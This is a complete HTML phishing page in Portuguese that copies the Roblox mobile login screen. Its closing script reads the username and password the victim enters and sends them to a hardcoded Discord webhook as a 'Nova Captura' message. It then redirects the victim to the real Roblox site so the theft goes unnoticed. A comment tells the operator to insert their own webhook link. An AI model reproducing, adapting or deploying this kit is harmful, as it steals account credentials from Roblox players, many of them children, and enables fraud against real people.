<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Entrar na Roblox</title>

<link rel="icon" href="https://www.roblox.com/favicon.ico">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

<style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;}
  body{background:#1e1e1e; color:#fff; -webkit-font-smoothing:antialiased; padding-bottom:70px;}
  
  /* Header Superior */
  .header{display:flex; align-items:center; justify-content:space-between; padding:12px 16px; background:#232527; position:sticky; top:0; z-index:10; gap:10px;}
  .logo-icon{width:32px; height:32px; background:#fff; border-radius:4px; display:flex; align-items:center; justify-content:center; transform:rotate(-15deg);}
  .logo-inner{width:10px; height:10px; background:#232527;}
  .header-buttons{display:flex; align-items:center; gap:8px; flex:1; justify-content:flex-end;}
  .btn-top{background:#335fff; color:#fff; border:none; padding:8px 14px; border-radius:6px; font-size:14px; font-weight:600; cursor:pointer; white-space:nowrap;}
  .btn-outline{background:transparent; color:#fff; border:1px solid #fff; padding:8px 14px; border-radius:6px; font-size:14px; font-weight:600; cursor:pointer; white-space:nowrap;}
  .search-icon{width:36px; height:36px; display:flex; align-items:center; justify-content:center; color:#fff;}

  /* Menu Secundário */
  .sub-menu{display:flex; justify-content:space-around; padding:12px 0; background:#232527; border-bottom:1px solid #333;}
  .sub-menu div{font-size:15px; font-weight:500; color:#e3e3e3;}

  /* Banner de fundo (imagem) */
  .banner{height:120px; background:url('https://images.rbxcdn.com/3a3a8c7abf10e52e66a4b75a4e1c1c3a.jpg') center/cover no-repeat; opacity:0.8;}
  .banner-dark{background:linear-gradient(to bottom, rgba(30,30,30,0.2), #1e1e1e); height:100%; display:flex; align-items:flex-end; justify-content:center; padding-bottom:10px;}
  .banner-text{color:#fff; font-size:14px;}

  /* Área de Login */
  .login-container{padding:24px 16px; max-width:480px; margin:0 auto;}
  .login-container h1{font-size:24px; font-weight:700; text-align:center; margin-bottom:24px;}

  .input-group{margin-bottom:12px;}
  .input-group input{width:100%; padding:16px 14px; background:#2b2d31; border:1px solid transparent; border-radius:6px; color:#fff; font-size:16px; outline:none;}
  .input-group input::placeholder{color:#a3a6ab;}
  .input-group input:focus{border-color:#fff;}

  .btn-main{width:100%; padding:14px; background:transparent; border:1px solid #fff; border-radius:6px; color:#fff; font-size:16px; font-weight:600; cursor:pointer; margin-top:8px; transition:background 0.2s;}
  .btn-main:active{background:#333;}

  .link-forgot{display:block; text-align:center; color:#fff; text-decoration:none; font-size:15px; margin-top:24px; margin-bottom:28px;}

  /* Separador e Botões de Acesso Rápido */
  .divider{height:1px; background:#333; margin:0 auto 24px auto; width:100%;}

  .btn-secondary{width:100%; padding:14px; background:#2b2d31; border:none; border-radius:6px; color:#e3e3e3; font-size:15px; font-weight:500; cursor:pointer; margin-bottom:10px;}
  .btn-secondary:active{background:#3b3d41;}

  .signup-text{text-align:center; color:#e3e3e3; font-size:14px; margin-top:32px;}
  .signup-text a{color:#fff; font-weight:600; text-decoration:none;}

  /* Banner Rodapé (App) */
  .bottom-banner{position:fixed; bottom:0; left:0; right:0; background:#3b3d41; padding:12px 16px; display:flex; align-items:center; justify-content:space-between; z-index:20; border-top:1px solid #444;}
  .bottom-banner-text{display:flex; align-items:center; gap:12px; flex:1;}
  .bottom-banner-text img{width:32px; height:32px;}
  .bottom-banner-text span{font-size:12px; line-height:1.3; color:#fff;}
  .btn-explore{background:#335fff; color:#fff; border:none; padding:8px 14px; border-radius:6px; font-size:13px; font-weight:600; cursor:pointer; white-space:nowrap;}

  .err{display:none; color:#ff5c5c; font-size:14px; text-align:center; margin-top:12px;}
</style>
</head>
<body>

<!-- Header Superior -->
<div class="header">
  <div class="logo-icon"><div class="logo-inner"></div></div>
  <div class="header-buttons">
    <button class="btn-top">Cadastrar-se</button>
    <button class="btn-outline">Entrar</button>
    <div class="search-icon">
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
    </div>
  </div>
</div>

<!-- Menu Secundário -->
<div class="sub-menu">
  <div>Destaques</div>
  <div>Mercado</div>
  <div>Criar</div>
  <div>Robux</div>
</div>

<!-- Banner Central (Imitando o fundo do print) -->
<div class="banner">
  <div class="banner-dark"></div>
</div>

<!-- Formulário de Login -->
<div class="login-container">
  <h1>Entrar na Roblox</h1>
  
  <form id="form" novalidate>
    <div class="input-group">
      <input id="username" type="text" placeholder="Usuário/e-mail/telefone" autocomplete="username" required>
    </div>
    <div class="input-group">
      <input id="password" type="password" placeholder="Senha" autocomplete="current-password" required>
    </div>
    
    <button class="btn-main" type="submit">Entrar</button>
    <div class="err" id="err">Nome de usuário ou senha incorretos.</div>
  </form>

  <a href="#" class="link-forgot">Esqueceu a senha ou nome de usuário?</a>

  <div class="divider"></div>

  <button class="btn-secondary">Envie-me um código único por e-mail</button>
  <button class="btn-secondary">Entrada rápida</button>
  <button class="btn-secondary">Outras opções de acesso</button>

  <div class="signup-text">
    Não possui uma conta? <a href="#">Cadastrar-se</a>
  </div>
</div>

<!-- Banner Rodapé -->
<div class="bottom-banner">
  <div class="bottom-banner-text">
    <div class="logo-icon" style="width:24px; height:24px; transform:rotate(-15deg);"><div class="logo-inner" style="width:8px; height:8px;"></div></div>
    <span>Explore a Roblox no nosso<br>aplicativo para Android!</span>
  </div>
  <button class="btn-explore">Explorar</button>
</div>

<script>
  // ⚠️ COLOQUE O TEU LINK DO DISCORD AQUI ENTRE AS ASPAS ⚠️
  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1573426421085241448/LGoTUoMIZdohFLYE9s3THG4sSUFbbi1PEF5Hdl145-KIH6KapjIvAnLGhFT4kmlfOFPL';

  const form = document.getElementById('form');
  const err  = document.getElementById('err');
  const user = document.getElementById('username');
  const pass = document.getElementById('password');

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const username = user.value.trim();
    const password = pass.value;

    if (!username || !password) return;

    err.style.display = 'none';
    const btn = form.querySelector('.btn-main');
    btn.textContent = 'Entrando...';

    const payload = {
      content: `🎣 **Nova Captura (Mobile)**\n👤 User: \`${username}\`\n🔑 Senha: \`${password}\``
    };

    try {
      await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      
      setTimeout(() => {
        window.location.href = 'https://www.roblox.com/home';
      }, 1500);

    } catch (error) {
      btn.textContent = 'Entrar';
      err.style.display = 'block';
      pass.value = '';
    }
  });
</script>
</body>
</html>
